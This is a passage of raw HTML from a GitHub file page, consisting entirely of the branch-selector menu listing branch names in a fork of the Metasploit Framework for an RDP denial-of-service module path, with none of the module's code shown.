                 data-name="fail_with_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fail_with_fix">fail_with_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/addp-modules/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/addp-modules"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/addp-modules">feature/addp-modules</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/all-modules-load-spec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/all-modules-load-spec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/all-modules-load-spec">feature/all-modules-load-spec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/bump-rails-and-gemcache/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/bump-rails-and-gemcache"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/bump-rails-and-gemcache">feature/bump-rails-and-gemcache</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/codeclimate.com/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/codeclimate.com"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/codeclimate.com">feature/codeclimate.com</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/gemize-kissfft/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/gemize-kissfft"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/gemize-kissfft">feature/gemize-kissfft</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/metsploit-data-models-0.3.0/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/metsploit-data-models-0.3.0"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/metsploit-data-models-0.3.0">feature/metsploit-data-models-0.3.0</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/niagara-modules/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/niagara-modules"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/niagara-modules">feature/niagara-modules</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/railgun/error_msg/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/railgun/error_msg"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/railgun/error_msg">feature/railgun/error_msg</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/realport-modules/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/realport-modules"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/realport-modules">feature/realport-modules</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/travis-ci.org/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/travis-ci.org"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/travis-ci.org">feature/travis-ci.org</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/udp-scanner-mixin/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/udp-scanner-mixin"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/udp-scanner-mixin">feature/udp-scanner-mixin</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/feature/updated-mobile/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="feature/updated-mobile"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="feature/updated-mobile">feature/updated-mobile</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/file_dropper_support_local/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="file_dropper_support_local"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="file_dropper_support_local">file_dropper_support_local</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/findpids/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="findpids"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="findpids">findpids</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/firefox_onreadystatechange/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="firefox_onreadystatechange"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="firefox_onreadystatechange">firefox_onreadystatechange</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix-2438/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix-2438"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix-2438">fix-2438</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_auth_brute/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_auth_brute"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_auth_brute">fix_auth_brute</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_dlink_command_php/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_dlink_command_php"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_dlink_command_php">fix_dlink_command_php</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_dlink_dir300_exec_telnet/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_dlink_dir300_exec_telnet"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_dlink_dir300_exec_telnet">fix_dlink_dir300_exec_telnet</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_dlink_upnp_exec_noauth/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_dlink_upnp_exec_noauth"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_dlink_upnp_exec_noauth">fix_dlink_upnp_exec_noauth</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_ex_handle/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_ex_handle"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_ex_handle">fix_ex_handle</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_firefox_condition/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_firefox_condition"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_firefox_condition">fix_firefox_condition</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_ge_proficy/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_ge_proficy"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_ge_proficy">fix_ge_proficy</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_gestioip_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_gestioip_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_gestioip_exec">fix_gestioip_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_hp_operations_get_once/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_hp_operations_get_once"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_hp_operations_get_once">fix_hp_operations_get_once</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_jtr_mixin/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_jtr_mixin"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_jtr_mixin">fix_jtr_mixin</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_nbns_response_descr/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_nbns_response_descr"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_nbns_response_descr">fix_nbns_response_descr</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_payload_encoding/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_payload_encoding"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_payload_encoding">fix_payload_encoding</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_python_load/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_python_load"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_python_load">fix_python_load</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_require_portproxy/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_require_portproxy"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_require_portproxy">fix_require_portproxy</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_rspec_ropdb/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_rspec_ropdb"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_rspec_ropdb">fix_rspec_ropdb</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fix_zdi_ref/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fix_zdi_ref"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fix_zdi_ref">fix_zdi_ref</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/fixes-ie-0day/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="fixes-ie-0day"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="fixes-ie-0day">fixes-ie-0day</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/foreman_username/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="foreman_username"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="foreman_username">foreman_username</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/foswiki_maketext/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="foswiki_maketext"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="foswiki_maketext">foswiki_maketext</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/foxit_reader_plugin_url_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="foxit_reader_plugin_url_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="foxit_reader_plugin_url_bof">foxit_reader_plugin_url_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/freebsd_fix/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="freebsd_fix"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="freebsd_fix">freebsd_fix</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/freefloat/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="freefloat"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="freefloat">freefloat</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/github_pulls/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="github_pulls"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="github_pulls">github_pulls</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/gpp-passwords/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="gpp-passwords"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="gpp-passwords">gpp-passwords</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/grammar-fixes/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="grammar-fixes"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="grammar-fixes">grammar-fixes</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/groundwork_monarch_cmd_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="groundwork_monarch_cmd_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="groundwork_monarch_cmd_exec">groundwork_monarch_cmd_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/groupwise_traversal/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="groupwise_traversal"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="groupwise_traversal">groupwise_traversal</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/handler-requires-race/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="handler-requires-race"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="handler-requires-race">handler-requires-race</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hmoore-r7-module-loader/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hmoore-r7-module-loader"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hmoore-r7-module-loader">hmoore-r7-module-loader</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/honeywell_tema_exec/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="honeywell_tema_exec"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="honeywell_tema_exec">honeywell_tema_exec</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hp_dataprotector_dtbclslogin/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hp_dataprotector_dtbclslogin"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hp_dataprotector_dtbclslogin">hp_dataprotector_dtbclslogin</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hp_imc_faultdownloadservlet_traversal/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hp_imc_faultdownloadservlet_traversal"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hp_imc_faultdownloadservlet_traversal">hp_imc_faultdownloadservlet_traversal</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hp_imc_ictdownloadservlet_traversal/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hp_imc_ictdownloadservlet_traversal"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hp_imc_ictdownloadservlet_traversal">hp_imc_ictdownloadservlet_traversal</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hp_imc_mibfileupload/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hp_imc_mibfileupload"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hp_imc_mibfileupload">hp_imc_mibfileupload</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hp_imc_reportimgservlt_traversal/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hp_imc_reportimgservlt_traversal"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hp_imc_reportimgservlt_traversal">hp_imc_reportimgservlt_traversal</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hp_mpa_job_acct/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hp_mpa_job_acct"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hp_mpa_job_acct">hp_mpa_job_acct</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hp_snac_enum_creds/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hp_snac_enum_creds"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hp_snac_enum_creds">hp_snac_enum_creds</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hp_system_mgmt_work/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hp_system_mgmt_work"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hp_system_mgmt_work">hp_system_mgmt_work</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hp_vsa_exec_9/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hp_vsa_exec_9"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hp_vsa_exec_9">hp_vsa_exec_9</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/hp_vsa_login_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="hp_vsa_login_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="hp_vsa_login_bof">hp_vsa_login_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ibm_cognos_tm1admsd_bof/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ibm_cognos_tm1admsd_bof"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ibm_cognos_tm1admsd_bof">ibm_cognos_tm1admsd_bof</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ibm_director_cim_dllinject/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ibm_director_cim_dllinject"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ibm_director_cim_dllinject">ibm_director_cim_dllinject</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ibm_spss_c1sizer/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ibm_spss_c1sizer"
                 data-skip-pjax="true"
                 rel="nofollow"
                 class="js-navigation-open select-menu-item-text js-select-button-text css-truncate-target"
                 title="ibm_spss_c1sizer">ibm_spss_c1sizer</a>
            </div> <!-- /.select-menu-item -->
            <div class="select-menu-item js-navigation-item ">
              <span class="select-menu-item-icon octicon octicon-check"></span>
              <a href="/jvazquez-r7/metasploit-framework/blob/ie_cdwnbindinfo_uaf/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb"
                 data-name="ie_cdwnbindinfo_uaf"
                 data-skip-pjax="true"
